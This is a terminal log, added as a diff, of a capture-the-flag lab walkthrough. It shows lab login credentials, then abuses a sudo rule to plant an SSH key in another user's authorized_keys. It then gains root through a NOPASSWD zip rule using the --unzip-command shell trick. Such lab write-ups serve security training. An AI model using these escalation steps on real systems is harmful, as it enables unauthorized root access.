@@ -1,0 +1,136 @@
+
+
+Username: pinak
+Password: Gandiv
+
+
+
+pinak@ubuntu:~$ 
+pinak@ubuntu:~$ ssh-keygen 
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/pinak/.ssh/id_rsa): 
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/pinak/.ssh/id_rsa.
+Your public key has been saved in /home/pinak/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:1tqJosv16lM7oAhTYaXoISS3sdxnhrb77R2sUGnuyAY pinak@ubuntu
+The key's randomart image is:
++---[RSA 2048]----+
+|..o..            |
+|o+o* .           |
+|oo=.+ +          |
+|o o. =   o       |
+| o  .   S .      |
+|o   E..=.= .     |
+| o ..o+o+.=      |
+|  ...=oBoo .     |
+|    ++*+*..      |
++----[SHA256]-----+
+pinak@ubuntu:~$ 
+pinak@ubuntu:~$ 
+pinak@ubuntu:~$ ls
+pinak@ubuntu:~$ ls -la
+total 32
+drwxr-xr-x 4 pinak pinak 4096 Jan  6 08:07 .
+drwxr-xr-x 5 root  root  4096 Nov  7 21:01 ..
+-rw------- 1 pinak pinak    1 Nov  8 09:06 .bash_history
+-rw-r--r-- 1 pinak pinak  220 Nov  7 21:00 .bash_logout
+-rw-r--r-- 1 pinak pinak 3771 Nov  7 21:00 .bashrc
+drwx------ 2 pinak pinak 4096 Nov  7 21:04 .cache
+-rw-r--r-- 1 pinak pinak  807 Nov  7 21:00 .profile
+drwx------ 2 pinak pinak 4096 Jan  6 08:09 .ssh
+pinak@ubuntu:~$ cd .ssh/
+pinak@ubuntu:~/.ssh$ ls -la
+total 16
+drwx------ 2 pinak pinak 4096 Jan  6 08:09 .
+drwxr-xr-x 4 pinak pinak 4096 Jan  6 08:07 ..
+-rw------- 1 pinak pinak 1679 Jan  6 08:09 id_rsa
+-rw-r--r-- 1 pinak pinak  394 Jan  6 08:09 id_rsa.pub
+pinak@ubuntu:~/.ssh$ 
+pinak@ubuntu:~/.ssh$ 
+pinak@ubuntu:~/.ssh$ chmod 777 id_rsa.pub 
+pinak@ubuntu:~/.ssh$ cp id_rsa.pub /home/pinak/
+pinak@ubuntu:~/.ssh$ 
+pinak@ubuntu:~/.ssh$ 
+pinak@ubuntu:~/.ssh$ cd ..
+pinak@ubuntu:~$ sudo -u sarang /bin/cp ./id_rsa.pub /home/sarang/.ssh/authorized_keys
+pinak@ubuntu:~$ ssh sarang@192.168.179.128 -p 65345 -i /.ssh/id_rsa
+Warning: Identity file /.ssh/id_rsa not accessible: No such file or directory.
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+Last login: Thu Nov  7 21:35:24 2019 from 192.168.0.100
+sarang@ubuntu:~$ 
+sarang@ubuntu:~$ sudo -l
+Matching Defaults entries for sarang on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User sarang may run the following commands on ubuntu:
+    (root) NOPASSWD: /usr/bin/zip
+sarang@ubuntu:~$ 
+sarang@ubuntu:~$ 
+sarang@ubuntu:~$ touch hello
+sarang@ubuntu:~$ ll
+total 32
+drwxr-xr-x 4 sarang sarang 4096 Jan  6 08:14 ./
+drwxr-xr-x 5 root   root   4096 Nov  7 21:01 ../
+-rw------- 1 sarang sarang    1 Nov  8 09:07 .bash_history
+-rw-r--r-- 1 sarang sarang  220 Nov  7 21:01 .bash_logout
+-rw-r--r-- 1 sarang sarang 3771 Nov  7 21:01 .bashrc
+drwx------ 2 sarang sarang 4096 Nov  7 21:07 .cache/
+-rw-rw-r-- 1 sarang sarang    0 Jan  6 08:14 hello
+-rw-r--r-- 1 sarang sarang  807 Nov  7 21:01 .profile
+drwx------ 2 sarang sarang 4096 Jan  6 08:11 .ssh/
+sarang@ubuntu:~$ sudo /usr/bin/zip 1.zip hello -T --unzip-command="/bin/bash"
+  adding: hello (stored 0%)
+zi0oDoFj: line 1: $'PK\003\004': command not found
+zi0oDoFj: line 2: $'P\005\034helloUT': command not found
+zi0oDoFj: line 2: $'\330A': command not found
+zi0oDoFj: line 3: $'P\005\030\264\201helloUT\005\003\370\023^ux\v\001\004\352\003\004\352\003PK\005\006\001\001K?': command not found
+test of 1.zip FAILED
+
+zip error: Zip file invalid, could not spawn unzip, or wrong unzip (original files unmodified)
+sarang@ubuntu:~$ zi0oDoFj: line 3: $'\330A': command not found
+
+sarang@ubuntu:~$ 
+sarang@ubuntu:~$ sudo /usr/bin/zip 1.zip hello -T --unzip-command="sh -c /bin/bash"
+
+root@ubuntu:/root# cat flag.txt 
+          
+                                            @p
+                                           @@@.
+                                          @@@@@
+                                         @@@@@@@
+                                        *"`]@P ^^
+                                           ]@P
+                                           ]@P
+                               ,,,,        ]@P       ,,gg,,
+                           g@@@@@@@@@b     ]@P    ,@@@@@@@@@@g,
+                        ,@@@@@@BNPPNB@@@@@@@@@@@@@@@@P**PNB@@@@@w
+                      g@@@@P^`        %NNNNN@NNNNNP          *B@@@g
+                    g@@@P`                 -@                   "B@@w
+                  ,@@@`                    ]@                      %@@,
+                 @@P-                      ]@                        *@@,
+              ,@@"                         ]@                          *B@
+            ,@N"                          y@@B                            %@,
+      ,,  g@P-                            ]@@@P                             *Bg ,gg
+      @@@@$,,,,,,,,,,,,,,,,,,,,,,,,,,ggggg@@@@wwwwwwwwwgggggggggww==========mm4NNN"
+
+!! Congrats you have finished this task !!		
+							
+Contact us here:						
+								
+Hacking Articles : https://twitter.com/rajchandel/		
+Nisha Sharma     : https://in.linkedin.com/in/nishasharmaa								
+								
++-+-+-+-+-+ +-+-+-+-+-+-+-+					
+ |E|n|j|o|y| |H|A|C|K|I|N|G|			
+ +-+-+-+-+-+ +-+-+-+-+-+-+-+						
+____________________________________
+
+root@ubuntu:/root# 
+
